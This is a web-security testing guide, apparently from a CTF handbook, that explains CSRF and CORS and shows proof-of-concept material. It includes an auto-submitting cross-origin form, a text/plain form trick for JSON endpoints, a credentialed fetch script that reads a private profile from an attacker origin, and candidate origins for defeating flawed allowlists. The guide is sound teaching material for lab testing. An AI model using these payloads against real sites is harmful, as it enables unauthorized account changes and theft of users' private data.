---
title: "CSRF & CORS · Send vs Read"
weight: 52
bookToc: true
---

# CSRF and CORS

**CSRF asks whether another site can cause an authenticated action. CORS asks whether that site's JavaScript can read the response.** Demonstrate them in an actual browser; Repeater does not enforce browser security rules.

## 1. Record the prerequisites

```text
State-changing route and method:
Content type:
Authentication: automatic cookie, HTTP auth, or explicit bearer header?
CSRF token: where generated, where checked, bound to which session?
Cookie SameSite / Secure / domain / path:
Origin / Referer checks:
Actual browser result:
```

Bearer tokens added by the normal frontend from its own storage are not automatically added by an attacker origin. Cookies may be, subject to SameSite and third-party cookie policy.

## 2. CSRF baseline

Use your own authenticated account and a reversible action:

```http
POST /api/profile/email HTTP/1.1
Host: ctf.invalid
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded
Origin: https://ctf.invalid

email=player%40example.invalid&csrf=ORIGINAL_TOKEN
```

First replay normally. Then compare omitted token, empty token, random token and a token from your second account. Change only one property per request. A rejected request in Repeater says nothing about whether a browser can send a different permitted request format.

## 3. Cross-origin HTML form proof

Host this on a distinct permitted test origin, then visit it while logged in to the challenge:

```html
<!doctype html>
<form action="https://ctf.invalid/api/profile/email" method="POST">
  <input name="email" value="ctf-test@example.invalid">
  <button>Submit test</button>
</form>
```

After a deliberate submit proves the action, an automatic submission tests whether interaction is necessary:

```html
<script>document.forms[0].submit()</script>
```

Forms can send cross-origin requests without CORS permission; the response is usually unreadable to the attacker page. Verify the changed email back in the original account. A form loading an error page is not success.

## 4. Content-type and method constraints

| Browser-generated request | Important restriction |
| --- | --- |
| GET navigation | May carry Lax cookies in a cross-site top-level safe navigation |
| POST form URL-encoded | Can be sent without a CORS preflight |
| POST multipart form | Can be sent without a preflight when browser builds it |
| POST `text/plain` | Can be sent without a preflight; server must accept that body |
| JSON `application/json` fetch | Normally preflighted cross-origin |
| Custom authorization/header | Normally preflighted; cannot assume browser sends it |

For a JSON-only endpoint, test whether server accepts the same JSON body with `Content-Type: text/plain`. If it strictly enforces JSON, a simple cross-origin request may fail. `fetch(..., {mode:'no-cors'})` does not permit arbitrary headers or make the response readable.

A `text/plain` form body uses `name=value` lines. The following only fits a server that parses JSON regardless of the declared type and tolerates the extra field:

```html
<form action="https://ctf.invalid/api/settings" method="POST" enctype="text/plain">
  <input name='{"theme":"dark","padding":"' value='"}'>
  <button>Test</button>
</form>
```

The resulting line is `{"theme":"dark","padding":"="}` plus a newline, which is valid JSON. Match the actual endpoint shape; this is not a universal JSON CSRF bypass.

## 5. SameSite: site and origin differ

`https://a.example.invalid` and `https://b.example.invalid` are different origins but normally the same site. SameSite is not an origin-isolation mechanism. Scheme participates in modern site calculation. Cookie Domain scope still determines which host receives a cookie.

- `Strict`: restricted cross-site sending; assess the full navigation flow.
- `Lax`: allows some top-level safe navigations; ordinary cross-site POST is generally excluded.
- `None`: requires `Secure` in modern browsers and can still be restricted by third-party-cookie policy.

Browser-specific recently-created cookie exceptions exist; observe the actual `Cookie` header rather than assuming a bypass. An attacker-controlled same-site origin can have a different threat model from an unrelated site.

## 6. CORS: controlled origin pair

```http
GET /api/private-profile HTTP/1.1
Host: ctf.invalid
Cookie: session=YOUR_SESSION
Origin: https://YOUR-LAB-HOST
```

Potentially dangerous response for a sensitive cookie-authenticated resource:

```http
Access-Control-Allow-Origin: https://YOUR-LAB-HOST
Access-Control-Allow-Credentials: true
Vary: Origin
```

Now compare `Origin: https://untrusted.example.invalid`. Is arbitrary origin reflected? Does sensitive data actually return? `Vary: Origin` helps caches handle origin-specific responses; it does not repair an unsafe origin allowlist.

`Access-Control-Allow-Origin: *` cannot authorize **credentialed browser reads** with cookies. A server returning both wildcard and credentials is misconfigured but does not by itself permit that read. A public unauthenticated API allowing `*` can be entirely intentional.

## 7. Browser CORS proof

Run from the permitted attacker origin:

```html
<pre id="result"></pre>
<script>
fetch('https://ctf.invalid/api/private-profile', {credentials:'include'})
  .then(r => r.text())
  .then(t => document.getElementById('result').textContent = t)
  .catch(e => document.getElementById('result').textContent = String(e));
</script>
```

Success means the cross-origin page reads the actual private response. A request appearing in network logs is not enough. The browser may send a request but block JS from reading its response. Cookie policy may also omit credentials despite `credentials:'include'`.

## 8. Preflight and allowlist checks

```http
OPTIONS /api/private-profile HTTP/1.1
Host: ctf.invalid
Origin: https://YOUR-LAB-HOST
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
```

Preflight usually has no ordinary session cookie. An allowed preflight alone is insufficient: the actual response must also permit the origin and credentials as needed.

If source suggests a flawed substring/suffix check, compare complete origins:

```text
https://trusted.example.invalid
https://trusted.example.invalid.YOUR-LAB-HOST
https://trusted-example.YOUR-LAB-HOST
null
```

The last is an Origin header value, not an ordinary hostname. Sandboxed/opaque-origin documents can produce `Origin: null`; reproducing credentialed reads still depends on browser cookie policy and iframe settings. Never claim exploitation solely because a manually inserted null header was reflected.

## 9. Finish with evidence

| Outcome | Finding |
| --- | --- |
| Cross-origin form changes your protected setting | CSRF proof for that browser/session configuration |
| Cross-origin JS reads your private data | CORS data exposure proof |
| Request sent, response blocked | May matter for CSRF; not a CORS read proof |
| Repeater sees ACAO, browser fails | Inspect actual origin, credentials, preflight, redirects and cookie restrictions |
| Endpoint requires unpredictable session-bound token | Normal form payload needs that token or another independent weakness |

Related: [XSS](../xss/) can run within the target origin and often read CSRF tokens; [JWT](../jwt/) covers explicit bearer tokens.

## Tool workflow

Use [Burp Community Repeater](../../ajcbbc_allow_tools/burp_suite_community/) for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.

## References

[MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS), [MDN SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value), [OWASP CSRF prevention and validation](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).
